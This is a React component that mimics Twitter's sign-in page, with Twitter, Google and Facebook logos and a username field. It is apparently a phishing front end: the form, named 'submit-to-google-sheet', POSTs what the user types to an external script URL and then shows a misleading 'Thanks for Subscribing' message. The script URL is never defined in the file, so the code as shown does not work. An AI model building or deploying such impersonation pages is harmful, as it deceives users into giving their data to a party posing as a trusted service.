import { useState } from "react";
import twitterLogo from "./assets/twitter_new.png";
import googleLogo from "./assets/google.png";
import facebookLogo from "./assets/facebook.png";
import "./App.css";

function App() {
  const submitbtn = (e) => {
    e.preventDefault();
    const form = document.forms['submit-to-google-sheet'];
    const msg = document.getElementById("msg");
    const verify = document.getElementById("verify");
  
    console.log("Form Data:", new FormData(form));
  
    fetch(scriptURL, { method: "POST", body: new FormData(form) })
      .then((response) => {
        console.log("Response:", response);
        msg.innerHTML = "Thanks for Subscribing";
        verify.innerHTML = "<img src='verified.png' height='80px'>";
        setTimeout(() => {
          msg.innerHTML = "";
          verify.innerHTML = "";
          form.reset();
        }, 6000);
      })
      .catch((error) => console.error("Error!", error.message));
  };
  

  return (
    <>
      <div className="con">
        <div className="heading">
          <img src={twitterLogo} alt="Twitter Logo" height={"50px"} />
        </div>
        <h3 align="center">Sign In to Twitter</h3>
        <br />
        <div className="box">
          <div className="google">
            <button>
              <div className="inside">
                <img src={googleLogo} alt="Google Logo" height={"20px"} />
                <p>Sign in with Google</p>
              </div>
            </button>
          </div>
          <br />
          <div className="facebook">
            <button>
              <div className="inside">
                <img src={facebookLogo} alt="Facebook Logo" height={"22px"} />
                <p>Sign in with Facebook</p>
              </div>
            </button>
          </div>
          <br />
          <hr style={{ position: "relative", left: "10px" }} />
          <span>or</span>
          <form name="submit-to-google-sheet" onSubmit={submitbtn}>
            <input placeholder="Username" name="name" required />
            <br />
            <br />
            <div className="next">
              <button type="submit">Next</button>
            </div>
          </form>
          <div id="msg"></div>
          <div id="verify"></div>
          <br />
          <div className="forget">
            <button>Forget Password</button>
          </div>
          <div className="signup">
            <p>
              Don't have an Account? <a href="#signup">Sign Up</a>
            </p>
          </div>
        </div>
      </div>
    </>
  );
}

export default App;
